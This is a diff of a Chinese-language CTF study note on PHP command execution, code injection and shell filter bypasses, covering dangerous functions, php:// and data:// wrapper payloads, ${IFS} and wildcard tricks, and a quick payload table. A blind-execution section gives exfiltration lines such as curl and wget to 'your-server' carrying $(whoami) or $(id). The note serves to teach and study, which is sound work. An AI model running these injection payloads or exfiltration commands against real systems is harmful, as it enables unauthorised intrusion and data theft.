@@ -1,460 +1,624 @@
-# 绕过 命令执行的过滤,函数
+# PHP命令执行与过滤绕过
 
-> [PHP官网](https://www.php.net/)    查看各类函数
+>[PHP 官方手册](https://www.php.net/manual/zh/)
+>
+>[程序执行函数](https://www.php.net/manual/zh/ref.exec.php)
+>
+>访问 [Rot13 / Atbash / Base64 编码解码](https://xobear.cn/CTF/Web/PHP/rot13base.html)
 
-访问 [Rot13AtbaseBase64编码解码](https://xobear.cn/CTF/Web/PHP/rot13base.html)
+这篇主要记录 CTF Web 中的 PHP 命令执行、代码执行和 Shell 过滤绕过。先区分两个概念：
 
-## 常见命令
+- **PHP 代码执行**：执行的是 PHP 代码，例如 `eval($_GET["a"])`。
+- **系统命令执行**：执行的是操作系统命令，例如 `system($_GET["cmd"])`。
 
-PHP 核心：var\_dump、include、file\_get\_contents、system、eval、phpinfo
-Linux 核心：cat、ls、find、id、pwd
+做题时先判断自己处在哪一层：PHP 语法层、Shell 命令层，还是文件包含/伪协议层。
 
-1.输出/打印
+## 常见危险函数
 
-```
-var_dump($var);       // 最常用：输出变量类型+值+长度，调试神器
+### 输出与调试
+
+```php
+var_dump($var);       // 输出类型和值
 print_r($var);        // 打印数组/对象结构
-echo $var;            // 直接输出字符串
-var_export($var);     // 输出可执行的PHP代码
-printf($fmt, $var);   // 格式化输出（绕过过滤常用）
+echo $var;            // 直接输出
+var_export($var);     // 输出接近 PHP 代码的结构
+printf("%s", $var);   // 格式化输出
+phpinfo();            // 查看 PHP 配置、版本、禁用函数、路径
 ```
 
-2.文件读取/包含类(伪协议搭配)
+### 文件读取与包含
 
-```
-include $_GET['file'];// 文件包含漏洞本体
-require $_GET['file'];
-include_once; require_once;
+```php
+include $_GET["file"];        // 文件包含
+require $_GET["file"];
+include_once $_GET["file"];
+require_once $_GET["file"];
 
-file_get_contents($f);// 读文件内容（读源码/flag）
-file_put_contents($f,$d);// 写文件（写马）
-readfile($f);         // 直接输出文件内容（无回显绕过神器）
-fopen(); fread();     // **文件指针读写**
-```
-
-3.命令执行
-
-```
-system('id');         // 执行命令+直接输出结果
-exec('id');           // 执行命令，只返回最后一行
-shell_exec('id');     // 反引号 `id` 等价，返回全部结果
-passthru('id');       // 执行命令+输出二进制流
-popen('id', 'r');     // 打开进程管道
+file_get_contents($f);        // 读取文件内容
+file_put_contents($f, $data); // 写文件
+readfile($f);                 // 读取并直接输出
+fopen($f, "r");               // 打开文件
+fread($fp, 1024);             // 读取文件指针
+highlight_file($f);           // 高亮源码
+show_source($f);              // highlight_file 的别名
+scandir(".");                 // 列目录
 ```
 
-4.信息获取查
+伪协议细节看：[PHP伪协议](./PHP伪协议.md)
 
-```
-phpinfo();            // 调试pyload是否可用。看PHP配置、禁用函数、路径、版本（必用）
-ini_get('xxx');       // 获取php.ini配置
-getcwd();             // 当前工作路径
-scandir('./');        // 列出目录文件
-dirname(__FILE__);    // 取文件目录
-```
+### PHP 代码执行
 
-\--|----|--5.编码解码
-
-```
-base64_encode(); base64_decode();
-urldecode(); urlencode();
-str_rot13();          // 绕过关键字过滤
-eval();               // *常用  执行PHP代码（一句话木马核心）
-assert();             // 断言=执行代码（绕过disable_functions常用）
+```php
+eval($_GET["code"]);
+assert($_GET["code"]);
+preg_replace("/.*/e", $_GET["code"], "");
+create_function("", $_GET["code"]);
 ```
 
-6.其他
-
-```
-ini_set('display_errors',1); // 开启报错
-error_reporting(E_ALL);      // 显示所有错误
-md5(); sha1();        // 哈希
-isset(); empty();     // 判断变量
-```
-
-7.Linux系统命令
-
-```
-whoami          // 查看当前用户 * 常用 
-ls              // 列出目录内容 * 常用 
-pwd             // 显示当前工作目录 * 常用 
-cat             // 查看文件内容
-echo            // 输出字符串 * 常用 
-mkdir           // 创建目录
-rm              // 删除文件或目录
-cp              // 复制文件或目录
-mv              // 移动或重命名文件或目录 * 常用 
-cat flag.php    // 读文件
-tac flag.php    // 倒着读（绕过cat过滤） * 常用 
-more flag       // 分页读
-less flag       // 分页读
-head flag       // 读前10行
-tail flag       // 读后10行
-nl flag         // 带行号读
-od -c flag      // 二进制读
-```
-
-8.通配符  转义
-
-```
-*   匹配任意字符（除换行符外）
-?   匹配单个字符 (常用于占位)
-[]  匹配括号内的任意一个字符
-[^] 匹配不在括号内的任意一个字符
-\   转义特殊字符
-```
-
-| 符号  | 含义    | URL |
-| --- | ----- | --- |
-| \ n | 换行    | %0A |
-| \ r | 回车    | %0D |
-| \ t | 水平制表符 | %09 |
-| \ ; | 分号    | %3B |
-| \ = | 等于号   | %3D |
-| \ # | #号    | %23 |
-| \\  | 空格    | %20 |
-| \ ? | 问号    | %3F |
-| \\  | 右斜杠   | %2F |
-
-## 0x1: preg_match()函数
-
-执行一个正则表达式匹配.***经常与if搭配用于过滤***
-
-
-```
-// 正确的过滤写法：只允许字母数字
-if (!preg_match('/^[a-zA-Z0-9]+$/', $input)) {
-    die('非法字符！只允许字母和数字'); // 不匹配白名单，直接拦住
-}
-// 匹配白名单，才继续执行
-echo '合法输入：' . $input;
-
-
-格式：int preg_match ( string $pattern , mixed $subject [, array &$matches [, int $flags = 0 [, int $offset = 0 ]]] )
-
-
-preg_match($pattern, $subject, $matches);
-
-String $pattern 正则表达式模式 (pattern='/      /')
-String $subject 要匹配的字符串
-String $matches 如果提供了matches,它将被填充为搜索到的匹配项
-
-```
-
-## 0x2: require和include
-
-require和include都是PHP中的文件包含函数，用于在脚本中包含和执行指定文件的内容。
-二者区别在于处理错误的方式不同
-
-1.require语句在执行时会检查文件是否存在，如果文件不存在则会生成一个致命错误（E\_COMPILE\_ERROR），**并停止脚本执行**
-
-`require 'filename.php';`
-
-2.include语句在执行时会检查文件是否存在，如果文件不存在则会生成一个警告（E\_WARNING），**但脚本会继续执行**
-
-`include 'filename.php';`
-
-## 0x3: system()函数
-
-执行一个外部程序
-
-```
-
-格式：int system ( string $command )
-system($command);
-String $command 要执行的命令
-
-```
-
-不需要使用括号的函数
-
-```
-echo
-print
-isset
-include
-reuqire
-```
-
-## 0x4: file\_get\_contents()函数
-
-读取文件内容
-
-```
-
-格式：string file_get_contents ( string $filename [, bool $use_include_path = FALSE [, resource $context [, int $offset = 0 [, int $maxlen ]]]] )
-
-file_get_contents($filename);
-
-String $filename 文件路径
-bool $use_include_path 是否使用 include_path 搜索
-resource $context 流上下文
-int $offset 起始偏移量
-int $maxlen 最大长度
-
-```
-
-## 0x5: 伪协议
-
-PHP 伪协议（又称流包装器）是 PHP 内建的资源访问机制，以`协议://资源`的 URL 格式，让`include、file_get_contents`等函数统一操作本地文件、远程资源、内存流、压缩包等不同数据源。**CTF 与代码审计中，它是文件包含、代码执行、源码泄露的核心利用手段。**
-
-| 协议                           | 核心能力                                | 关键条件 / 限制                                      | 典型利用示例                                                                 |
-| ---------------------------- | ----------------------------------- | ---------------------------------------------- | ---------------------------------------------------------------------- |
-| php\://filter/convert.base64 | 读取任意文件 / 处理文件源码（Base64 编码绕过执行）      | 无需开启远程配置                                       | ?file=php\://filter/read=convert.base64-encode/resource=index.php      |
-| php\://input                 | 读取 POST 原始数据，配合包含 **执行代码**          | 需allow\_url\_include=On；不支持multipart/form-data | URL：?file=php\://inputPOST：<?php system('id');?>                       |
-| data://text/plain,           | 内联数据直接执行（URL 嵌入代码）                  | 需allow\_url\_include=On（PHP≥5.2.0）             | ?file=data://text/plain,<?php system('id');?>                          |
-| file://                      | 访问本地文件系统（绝对 / 相对路径）                 | 不受远程配置限制（双 OFF 可用）                             | ?file=file:///etc/passwd（Linux）/ file://C:/windows/system.ini（Windows） |
-| zip\:///phar://              | 读取压缩包内文件（绕过后缀限制 / WAF）	压缩包为 ZIP 格式； | phar://需phar.readonly=Off                      | zip\:///tmp/shell.zip%23shell.php（%23为#URL 编码）                         |
-
-### data://text/plain
-
-`data://text/plain,base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKT8+`
-base64->`<?php system("tac flag.php")?>`-->`data://text/plain,<?php system("tac flag.php")?>`
-
-## 0x6 system($c.">/dev/null 2>&1"); 无回显
-
-拆解：
-
-`/dev/null` 是Linux的黑洞，写入的所有数据都会被丢弃不会保存
-
-`>` 重定向符 把**标准输出（stdout,文件描述符 1）** 写入到后面的文件/设备 （把命令正常输出丢进黑洞导致没有回显）
-
-`2>&1` 把 **标准错误（stderr，文件描述符 2）** 重定向到「标准输出 1 指向的位置」
-把错误输出绑定到标准输出（也就是 /dev/null）。
-
-常见的「无回显命令执行」写法，执行 $c 对应的系统命令，但不把任何结果输出到页面，用来绕过页面回显检测、隐藏执行痕迹。
-
-**可以使用结束符来截断">/dev/null 2>&1"**
-
-**`;`**  **`&&`**  **`||`**  **`#`**
-
-&& 和 || 在系统命令里也是结束符：本质是它们会分隔命令，让 Shell 把一行拆成多条命令执行，是命令执行的核心绕过手段
-
-| 分隔符     | 作用    | 执行逻辑                         | CTF 实战场景                                          |
-| ------- | ----- | ---------------------------- | ------------------------------------------------- |
-| ;（分号）   | 顺序执行符 | 无论前面的命令执行成功 / 失败，后面的命令一定会执行  | 最通用的分隔符，比如 id;whoami 会依次执行两个命令                    |
-| &&（逻辑与） | 成功执行符 | 只有前面的命令执行成功（返回码 0），后面的命令才会执行 | 用来做条件执行，比如 ls /flag && cat /flag，只有找到 flag 文件才会读取 |
-
-| `||` 逻辑或 | 失败执行符 |只有前面的命令执行失败（返回码非 0），后面的命令才会执行|   |
-
-```
-命令A || 命令B
-执行 命令A，拿到它的退出状态码（Linux 命令执行成功返回 0，失败返回非 0）
-如果 命令A 执行失败（状态码≠0），就执行 命令B
-如果 命令A 执行成功（状态码 = 0），直接跳过 命令B，不执行
-```
-
-`|`：管道符，前命令的输出作为后命令的输入
-
-` `` ` ：反引号包裹的命令会被 Shell 先执行，结果替换到原位置
-
-```
-Shell 会先执行反引号内部的命令，拿到命令的输出结果
-用这个结果完全替换掉反引号包裹的内容，再执行最终的命令
-等价写法：$(命令)（现代 Shell 推荐，可读性更好，可嵌套）
-
-##先执行`whoami`，拿到当前用户名（比如root），再执行echo root
-
-echo `whoami`
-等价与：echo $(whoami)
-```
-
-| 命令  | 作用               | 核心特点                     | 用途                                                  |
-| --- | ---------------- | ------------------------ | --------------------------------------------------- |
-| cat | concatenate（拼接）  | 按文件正常顺序输出全部内容            | 最常用的读文件命令，cat /flag.php 直接读取 flag  。需要ctrl+u查看源码    |
-| tac | cat 的反向拼写        | 按文件倒序输出内容（最后一行变第一行）      | 绕过过滤：如果 WAF 拦截 cat，用 tac /flag。php 替代               |
-| nl  | number lines（行号） | 输出文件内容，同时给**每一行加行号显示**   | 带行号读文件，比如 nl /etc/passwd 查看带行号的用户列表                 |
-| cut | 截取命令             | cut -c 按字符截取、cut -f 按列截取 | 提取文件特定内容，比如 `cat /flag	cut -c1-10` 读取 flag 前 10 个字符 |
-
-「nl 不支持 ? \* 等通配符」：nl 本身不支持通配符展开，通配符是 Shell 的特性，nl a\* 能生效是 Shell 先把 a\* 展开成匹配的文件名，再传给 nl，不是 nl 本身支持。
-
-其他替代读文件命令（CTF 绕过常用）：more less head tail od xxd 等，都可以用来绕过 cat 过滤。
-
-一个shell特性：两个单引号''分割的字符串会自动忽略''  `'ca''t flag.php'`->`'cat flag.php'`
-
-## 0x7 空格被过滤了
-
-preg_match过滤空格
-1.`$IFS`或`${IFS}`:SHELL环境变量 **内部字段分割符**。默认值包含空格 制表符 换行符
-对于用到空格的命令，shell解析时会自动替换为空格
-
-2.重定向符 `<` 或`>` shell自动处理重定向符号
-
-```
-tac<./flag.php
-利用输入重定向，把 ./flag.php 作为tac的标准输入
-```
-
-3.制表符 `$'\t'`  ` \t` `%09` 制表符与空格一样
-
-4.命令分组 **把一堆命令当成一个整体来处理**在shell中主要有两种写法`( )`和`{ }`
-
-当空格被过滤时，用命令分组来写无空格 payload。
-(tac,flag.php)
-{tac,flag.php}
-
-```
-多个命令下的区别
-1️⃣ 小括号 ( command1; command2; ) —— 子 Shell 分组
-
-在 子 Shell 进程 中执行命令
-不会影响当前 Shell 的环境（变量、目录等）
-语法比较宽容：最后一个命令后面可以加分号也可以不加
-临时切换目录、执行一串命令，又不想影响父 Shell
-命令流水线里做临时环境切换
-变量局部化（子 Shell 里的变量不会外泄）
-
-2️⃣ 花括号 { command1; command2; } —— 当前 Shell 分组
-
-在 当前 Shell 进程 执行命令
-会修改当前 Shell 的环境（变量、目录都会生效）
-语法要求非常严格（这是新手最容易踩坑的地方）
-
-
-运行
-{ command1; command2; }
-要求：
-{ 后面必须跟一个 空格
-} 前面必须有 分号；（可选并非必须，但为了安全与兼容，建议加）
-} 前后都必须有 空格
-```
-
-## 0x8 禁用字母（小）
-
-[参考无字母shell](https://blog.csdn.net/qq_61839115/article/details/128446902?spm=1001.2101.3001.6650.2\&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-2-128446902-blog-141113303.235%5Ev43%5Epc_blog_bottom_relevance_base7\&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-2-128446902-blog-141113303.235%5Ev43%5Epc_blog_bottom_relevance_base7)
-异或/或/取反/自增/上传文件
-过滤`小写字母  换行  制表符  PATH  BASH  HOME  \  ()  []  \\  +  -  =  ^  *  & % < > ' "`
-
-```
+版本注意：
+
+- `eval()` 一直危险。
+- `assert("php code")` 在 PHP 7.2 起弃用，PHP 8.0 起不再执行字符串代码。
+- `preg_replace /e` 在 PHP 5.5 弃用，PHP 7.0 移除。
+- `create_function()` 在 PHP 7.2 弃用，PHP 8.0 移除。
+
+### 系统命令执行
+
+| 函数/写法 | 输出行为 | 返回值特点 |
+| --- | --- | --- |
+| `system($cmd)` | 直接输出命令结果 | 返回最后一行输出 |
+| `exec($cmd)` | 默认不直接输出 | 返回最后一行，可用第二个参数接收全部输出 |
+| `shell_exec($cmd)` | 不直接输出 | 返回完整输出字符串 |
+| `passthru($cmd)` | 直接输出原始结果 | 适合二进制输出 |
+| `popen($cmd, "r")` | 返回进程管道 | 可用 `fread()` 读取 |
+| `proc_open()` | 可控 stdin/stdout/stderr | 更灵活 |
+| <code>`id`</code> | 不直接输出 | 反引号，类似 `shell_exec("id")` |
+
+示例：
+
+```php
 <?php
-if(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {
-  eval($_GET['shell']);
+system("id");
+echo shell_exec("whoami");
+echo `pwd`;
+```
+
+如果 `disable_functions` 禁用了 `shell_exec`，反引号通常也不可用。
+
+## 命令执行审计路线
+
+看到用户输入进入这些函数时就要敏感：
+
+```php
+system($_GET["cmd"]);
+exec($_POST["cmd"]);
+shell_exec($a);
+passthru($c);
+eval($_GET["code"]);
+include($_GET["file"]);
+```
+
+按这个顺序看：
+
+1. 输入来自哪里：`$_GET`、`$_POST`、`$_COOKIE`、`$_REQUEST`、请求头、上传文件。
+2. 进入的是 PHP 代码执行、系统命令执行，还是文件包含。
+3. 有没有过滤：正则、黑名单、长度、大小写、空格、特殊符号。
+4. 有没有回显：有回显直接读；无回显考虑写文件、DNS/HTTP 外带、时间盲注。
+5. 看环境：Linux/Windows、当前目录、权限、`disable_functions`、`open_basedir`。
+6. 看 Shell：通常是 `/bin/sh -c`，不是所有 Bash 特性都一定可用。
+
+## 常用信息收集命令
+
+```sh
+id
+whoami
+pwd
+ls
+ls -la
+find / -name flag* 2>/dev/null
+cat flag.php
+tac flag.php
+nl flag.php
+head flag.php
+tail flag.php
+base64 flag.php
+```
+
+常用 PHP 环境检查：
+
+```php
+phpinfo();
+echo phpversion();
+echo getcwd();
+print_r(scandir("."));
+echo ini_get("disable_functions");
+echo ini_get("open_basedir");
+```
+
+## Shell 分隔符与重定向
+
+| 符号 | 含义 | 示例 |
+| --- | --- | --- |
+| `;` | 顺序执行 | `id;whoami` |
+| `&&` | 前一条成功才执行后一条 | `ls /flag && cat /flag` |
+| `||` | 前一条失败才执行后一条 | `cat /no || cat /flag` |
+| <code>&#124;</code> | 管道，前者输出给后者 | <code>cat flag.php &#124; base64</code> |
+| `&` | 后台执行 | `sleep 5 &` |
+| `#` | 注释后续内容 | `id #` |
+| `%0a` | 换行，也可分隔命令 | `id%0awhoami` |
+| <code>`cmd`</code> | 命令替换 | <code>echo `whoami`</code> |
+| `$(cmd)` | 命令替换，较新写法 | `echo $(whoami)` |
+
+重定向：
+
+| 写法 | 含义 |
+| --- | --- |
+| `>` | 覆盖写入文件 |
+| `>>` | 追加写入文件 |
+| `<` | 从文件读入标准输入 |
+| `2>` | 重定向错误输出 |
+| `2>&1` | 把错误输出合并到标准输出 |
+| `>/dev/null 2>&1` | 丢弃正常输出和错误输出 |
+
+无回显题常见代码：
+
+```php
+system($c . " >/dev/null 2>&1");
+```
+
+可以尝试用分隔符截断后面的重定向：
+
+```text
+?c=id;
+?c=id%0a
+?c=id%23
+?c=id||whoami
+```
+
+是否成功取决于题目的拼接方式和过滤规则。
+
+## URL 编码速查
+
+| 字符 | URL 编码 |
+| --- | --- |
+| 空格 | `%20` 或 `+` |
+| 换行 | `%0A` |
+| 回车 | `%0D` |
+| Tab | `%09` |
+| `;` | `%3B` |
+| `&` | `%26` |
+| <code>&#124;</code> | `%7C` |
+| `#` | `%23` |
+| `?` | `%3F` |
+| `/` | `%2F` |
+| `\` | `%5C` |
+| `=` | `%3D` |
+
+## 空格被过滤
+
+常见替代：
+
+```sh
+cat${IFS}flag.php
+cat$IFS$9flag.php
+cat<flag.php
+tac<flag.php
+{cat,flag.php}
+```
+
+说明：
+
+- `${IFS}` 是 Shell 的内部字段分隔符，默认包含空格、Tab、换行。
+- `<` 可以把文件作为命令标准输入，例如 `tac<flag.php`。
+- `{cat,flag.php}` 是 Bash 的 brace expansion，会展开成 `cat flag.php`。
+- 目标环境如果是 `/bin/sh`，brace expansion 不一定可用。
+
+Tab 也可以当分隔符：
+
+```text
+cat%09flag.php
+```
+
+换行也可分隔命令：
+
+```text
+id%0awhoami
+```
+
+## 关键字被过滤
+
+### 过滤 `cat`
+
+替代读文件：
+
+```sh
+tac flag.php
+nl flag.php
+more flag.php
+less flag.php
+head flag.php
+tail flag.php
+od -c flag.php
+xxd flag.php
+base64 flag.php
+strings flag.php
+sed -n '1,120p' flag.php
+awk 1 flag.php
+```
+
+有些 PHP 源码在浏览器页面不显示，需要查看源码或 Base64：
+
+```sh
+base64 flag.php
+```
+
+### 过滤连续字符串
+
+Shell 会把相邻字符串拼接：
+
+```sh
+c'a't flag.php
+ca\t flag.php
+ca""t flag.php
+```
+
+变量拼接：
+
+```sh
+a=ca;b=t;$a$b flag.php
+```
+
+通配符：
+
+```sh
+/???/??t flag.php
+ca? flag.php
+```
+
+通配符由 Shell 展开，不是 `cat`、`nl` 等命令自己支持。
+
+### 过滤 `/`
+
+可以从环境变量中截取 `/`：
+
+```sh
+echo ${PATH:0:1}
+echo ${PWD:0:1}
+```
+
+构造路径：
+
+```sh
+cat ${PATH:0:1}etc${PATH:0:1}passwd
+```
+
+也可以尝试相对路径：
+
+```sh
+cat flag.php
+cat ./flag.php
+cat ../flag.php
+```
+
+## 小写字母被过滤
+
+如果能用 Bash，可以从环境变量里截取字符：
+
+```sh
+echo ${PATH:0:1}
+echo ${PWD:1:1}
+echo ${USER:0:1}
+```
+
+变量截取格式：
+
+```sh
+${VAR:offset:length}
+```
+
+示例：
+
+```sh
+VAR=abc
+echo ${VAR:0:1}  # a
+echo ${VAR:1:1}  # b
+echo ${VAR:2:1}  # c
+```
+
+变量长度可构造数字：
+
+```sh
+echo ${#VAR}
+echo ${#}
+echo ${##}
+```
+
+常见环境变量：
+
+| 变量 | 说明 |
+| --- | --- |
+| `$PWD` | 当前目录 |
+| `$PATH` | 可执行文件搜索路径 |
+| `$HOME` | 用户家目录 |
+| `$USER` | 当前用户名 |
+| `$SHELL` | Shell 路径 |
+| `$IFS` | 内部字段分隔符 |
+| `$RANDOM` | Bash 随机数 |
+| `$UID` | 用户 ID，Bash 常见 |
+| `$SHLVL` | Shell 层级 |
+| `$0` | 当前 Shell 或脚本名 |
+
+注意：
+
+- `${VAR:0:1}` 是 Bash 常见写法，`/bin/sh` 不一定支持。
+- 过滤非常严格时，通常要结合题目环境慢慢构造，不要直接套固定 payload。
+
+## 数字被过滤
+
+Bash 算术扩展可以产生数字：
+
+```sh
+echo $(())
+echo $((~$(())))
+```
+
+常见结果：
+
+```text
+$(())          -> 0
+$((~$(())))   -> -1
+${##}         -> 1
+$((${##}+${##})) -> 2
+```
+
+这些技巧依赖 Shell 特性，环境不同结果可能不同。
+
+## 无回显命令执行
+
+没有页面回显时，先确认命令是否执行：
+
+```sh
+sleep 5
+ping -c 1 your.dnslog.domain
+```
+
+常见外带：
+
+```sh
+curl http://your-server/$(whoami)
+wget http://your-server/$(id)
+ping -c 1 $(whoami).your.dnslog.domain
+```
+
+写 Web 目录：
+
+```sh
+echo test > a.txt
+cat flag.php > a.txt
+```
+
+如果当前目录不可写，先看：
+
+```sh
+pwd
+ls -la
+find /tmp -maxdepth 1 -type d -writable 2>/dev/null
+```
+
+错误输出也可能包含关键信息：
+
+```sh
+id 2>&1
+cat /notfound 2>&1
+```
+
+## Windows 命令执行
+
+有些题运行在 Windows，常见命令不同：
+
+```bat
+whoami
+dir
+type flag.txt
+cd
+echo test
+```
+
+分隔符：
+
+```bat
+command1 & command2
+command1 && command2
+command1 || command2
+```
+
+路径：
+
+```text
+C:\Windows\win.ini
+.\flag.txt
+..\flag.txt
+```
+
+## `preg_match()` 过滤
+
+常见白名单写法：
+
+```php
+<?php
+if (!preg_match('/^[a-zA-Z0-9]+$/', $input)) {
+    die("非法字符");
 }
-
 ```
 
+审计点：
 
+- 是否用了黑名单。
+- 是否用了 `i` 忽略大小写。
+- 是否用了 `m` 多行模式，影响 `^` 和 `$`。
+- 是否用了 `s`，让 `.` 匹配换行。
+- 是否把数组传给 `preg_match()`。
+- 是否正确判断返回值。
 
+错误判断示例：
 
-### 没有字母就截取环境变量的字母
-
-**shell变量截取-->字母**
-
-```
-$VAR="abc"
-echo ${VAR:0:1}--->a
-echo ${VAR:1:1}--->b
-echo ${VAR:2:1}--->c
-```
-
-`${VAR:offest:length}`**从offest位置截取length长度的字符**
-
-**变量长度-->数字**
-
-```
-$VAR="abc"
-$SUM="asbxasj"
-echo ${#VAR}--->3
-echo ${#SUM}--->7    
+```php
+if (strpos($cmd, "cat")) {
+    die("no cat");
+}
 ```
 
-`${#VAR}`**获取变量长度**
+如果 `cat` 出现在开头，`strpos()` 返回 `0`，条件为 false。正确写法：
 
-常见的环境变量名
-
-| 变量名              | 位置及用处                                    |
-| ---------------- | ---------------------------------------- |
-| $PWD             | 当前工作目录(./var/www/html)                   |
-| $SHLVL           | shell嵌套层级（默认值为1，2）本身就是纯数字${$SHLVL}->数字1  |
-| $RANDOM          | 生成随机数（0-32767） ${#RANDOM}->取位数 用于Bash环境下 |
-| $UID             | 当前用户UID(33->www-data   0->root)          |
-| $USER            | 当前用户名                                    |
-| $HOME            | 当前用户家目录(/home)                           |
-| $SHELL           | 当前用户登录shell                              |
-| $PATH            | 可执行文件搜索路径(./binsh)                       |
-| $IFS             | 内部字段分割符                                  |
-| $0               | 当前脚本名称                                   |
-| $1-$9            | 脚本参数                                     |
-| $@               | 所有参数                                     |
-| $#               | 参数个数                                     |
-| ${OPTIND}        | 当前选项索引                                   |
-| ${OPTARG}        | 当前选项参数                                   |
-| ${FUNCNAME}      | 当前函数名称                                   |
-| ${BASH\_SOURCE}  | 当前脚本名称                                   |
-| ${BASH\_LINENO}  | 当前行号                                     |
-| ${BASH\_VERSION} | Bash版本                                   |
-| ${OSTYPE}        | 操作系统类型                                   |
-| ${MACHTYPE}      | 机器类型                                     |
-
-## 0x9 过滤字母但没有过滤数字
-
-1.文件上传->RCE漏洞
-2.尝试使用/bin目录下的可执行程序。字母用不了需要使用通配符？来占位。
-`URL?c=./bin/base64%20flag.php`----->`?c=./???/????64%20????.???`  :将文件base64编码后输出
-文件上传在一个临时目录当中结束后会删除
-
-在Linux中 `.`是可以执行脚本的
-
-也可以使用 ANSI-C 风格的转义，格式为 **$'...'** ，省略号中用八进制
-
-[ANSI-C在线编码](https://xobear.cn/CTF/Web/PHP/ansi-c-encode.html)注意编码后的是16进制，还需要转为八进制
-
-### 如果过滤了数字
-
-`URL?c=.%20/???/????????[@-[]`
-
-
-在Linux中的shell
-echo$(())--->代表数学运算，并且
-
-`echo$(())   ----->0`
-`~`在shell 的 $(())里面是按位取反
-
-`echo$((~$(())))  ----> -1`这里 0的取反是 -1
-```
-0的补码是4x8个0   00000000 00000000 00000000 00000000
-全部取反后4x8个1  11111111 11111111 11111111 11111111
-对应的十进制数是 -1
-```
-既然有了-1 那么数字就可以使用了
-
-```
-补充：
-echo ${#} --->0
-echo ${##} --->1
-echo $((${##}+${##}))----> 2
+```php
+if (strpos($cmd, "cat") !== false) {
+    die("no cat");
+}
 ```
 
+## `include` / `require`
 
+区别：
 
+| 函数 | 文件不存在时 |
+| --- | --- |
+| `include` | Warning，脚本继续 |
+| `require` | Fatal Error，脚本终止 |
+| `include_once` | 只包含一次 |
+| `require_once` | 只包含一次，失败终止 |
 
-## 0x10 禁用函数
-先查phpinfo()看看禁用了那些函数
-如果phpinfo()被禁用了那只能盲猜了
+文件包含常和伪协议配合：
 
-file_get_contents('')读取文件（远程文件获取）
-
-多尝试include()参数逃逸
+```text
+?file=php://filter/read=convert.base64-encode/resource=index.php
+?file=php://input
+?file=data://text/plain,<?php system("id"); ?>
 ```
-php文件包含+php伪协议
-一句话后门(POST/GET) c=include($_GET['1']);
-url/? 1=php://filter/convert.base64-encode/resource=flag.php
+
+具体看：[PHP伪协议](./PHP伪协议.md)
+
+## `system()` 示例
+
+基础格式：
+
+```php
+<?php
+system("id");
 ```
 
+危险写法：
 
+```php
+<?php
+$cmd = $_GET["cmd"];
+system($cmd);
+```
 
+Payload：
 
+```text
+?cmd=id
+?cmd=whoami
+?cmd=cat%20flag.php
+?cmd=cat${IFS}flag.php
+?cmd=tac<flag.php
+```
 
+## `file_get_contents()` 示例
 
+读取文件：
 
+```php
+<?php
+echo file_get_contents($_GET["file"]);
+```
 
+Payload：
 
+```text
+?file=flag.php
+?file=php://filter/read=convert.base64-encode/resource=flag.php
+?file=/etc/passwd
+```
 
+如果 `allow_url_fopen=On`，还可能读取 URL：
 
+```text
+?file=http://example.com/a.txt
+```
 
+但远程读取和远程包含是两回事；远程包含还需要 `allow_url_include=On`。
 
+## 禁用函数
 
+先看：
 
+```php
+phpinfo();
+echo ini_get("disable_functions");
+```
 
+常见被禁函数：
 
+```text
+system, exec, shell_exec, passthru, popen, proc_open, pcntl_exec
+```
 
+如果命令执行函数都被禁：
 
+- 看是否还有 PHP 代码执行：`eval`、可变函数、回调函数。
+- 看是否能文件读取：`file_get_contents`、`readfile`、`highlight_file`。
+- 看是否能文件写入：`file_put_contents`、上传。
+- 看是否能文件包含 + 伪协议。
+- 看是否能 SQL 注入、SSRF、反序列化绕到别的利用链。
+
+不要把 `assert()` 当成稳定的命令执行绕过；PHP 8 已不再执行字符串断言代码。
+
+## 防护函数与绕过观察
+
+开发中常见防护：
+
+```php
+escapeshellarg($arg);
+escapeshellcmd($cmd);
+```
+
+作用：
+
+- `escapeshellarg()` 把一个参数安全地作为单个 Shell 参数。
+- `escapeshellcmd()` 转义命令字符串中的特殊字符。
+
+CTF 审计时注意：
+
+- 是整个命令可控，还是只有某个参数可控。
+- 是否先拼接再转义。
+- 是否存在编码、换行、数组、宽字节等输入处理差异。
+- Windows 和 Linux 的转义规则不同。
+
+## 快速 payload 表
+
+| 场景 | Payload |
+| --- | --- |
+| 看身份 | `id` |
+| 看用户 | `whoami` |
+| 当前目录 | `pwd` |
+| 列目录 | `ls -la` |
+| 读文件 | `cat flag.php` |
+| `cat` 被过滤 | `tac flag.php`、`nl flag.php`、`base64 flag.php` |
+| 空格被过滤 | `cat${IFS}flag.php`、`cat<flag.php`、`{cat,flag.php}` |
+| 无回显检测 | `sleep 5` |
+| 错误回显 | `id 2>&1` |
+| 写文件 | `echo test>a.txt` |
+| 源码读取 | `php://filter/read=convert.base64-encode/resource=index.php` |
+
+## 做题检查清单
+
+1. 找危险函数：`system`、`exec`、`shell_exec`、`passthru`、反引号、`eval`、`include`。
+2. 看用户输入能否到危险函数。
+3. 判断是 PHP 代码层还是 Shell 命令层。
+4. 先用 `id`、`whoami`、`pwd`、`ls` 测试。
+5. 看是否有回显；没有就用时间、写文件、DNS/HTTP 外带。
+6. 看过滤了什么：空格、斜杠、字母、数字、分隔符、关键字。
+7. 根据过滤选择 `${IFS}`、重定向、通配符、拼接、编码、替代命令。
+8. 看 `disable_functions`、`open_basedir`、`allow_url_include`。
+9. 如果命令执行走不通，转向文件读取、文件包含、上传、反序列化、SQL 注入。
